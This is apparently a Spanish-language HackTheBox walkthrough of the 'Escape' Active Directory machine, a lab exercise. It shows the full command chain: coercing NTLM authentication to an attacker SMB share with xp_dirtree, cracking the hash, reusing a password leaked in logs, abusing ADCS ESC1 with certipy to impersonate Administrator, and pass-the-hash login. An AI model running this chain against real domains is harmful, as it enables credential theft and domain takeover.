# Escape

**Plataforma:** HackTheBox · **Dificultad:** Medium · **SO:** Windows

Máquina de Active Directory: foothold vía MSSQL, movimiento lateral con
credenciales en logs, y escalada a Domain Admin abusando de ADCS (ESC1).

## Enumeración

```bash
nmap -sC -sV -p- 10.10.11.x
```

Puertos típicos de un DC: 53, 88 (Kerberos), 389/636 (LDAP), 445 (SMB) y
1433 (MSSQL).

## Foothold

Un recurso compartido SMB accesible con sesión nula contiene un PDF con
credenciales de invitado para MSSQL. Nos conectamos:

```bash
impacket-mssqlclient PublicUser:'GuestUserCantWrite1'@10.10.11.x
```

Forzamos autenticación NTLM hacia nuestro `responder` con `xp_dirtree`:

```sql
EXEC xp_dirtree '\\10.10.14.x\share', 1, 1;
```

Capturamos el hash NetNTLMv2 de la cuenta de servicio y lo crackeamos:

```bash
hashcat -m 5600 sql_svc.hash rockyou.txt
```

## Movimiento lateral

Con `sql_svc` accedemos por WinRM. En `C:\SQLServer\Logs\ERRORLOG.BAK`
encontramos una contraseña tecleada por error en el campo de usuario, que
pertenece a `ryan.cooper`.

```bash
evil-winrm -i 10.10.11.x -u ryan.cooper -p 'Nuclear********'
```

## Escalada: ADCS (ESC1)

Enumeramos plantillas de certificado vulnerables con Certify:

```
Certify.exe find /vulnerable
```

La plantilla permite que el solicitante especifique el `subjectAltName`, lo que
nos deja pedir un certificado como `Administrator`:

```bash
certipy req -u ryan.cooper -p 'Nuclear********' \
  -ca sequel-DC-CA -template UserAuthentication \
  -upn administrator@sequel.htb
```

Usamos el certificado para obtener el hash NT del administrador vía PKINIT:

```bash
certipy auth -pfx administrator.pfx
```

## Domain Admin

```bash
evil-winrm -i 10.10.11.x -u administrator -H <hash>
type C:\Users\Administrator\Desktop\root.txt
```

## Aprendizajes

- Las sesiones nulas en SMB siguen filtrando información sensible.
- Los logs son un tesoro de credenciales mal ubicadas.
- ADCS mal configurado (ESC1) es una ruta directa a Domain Admin.
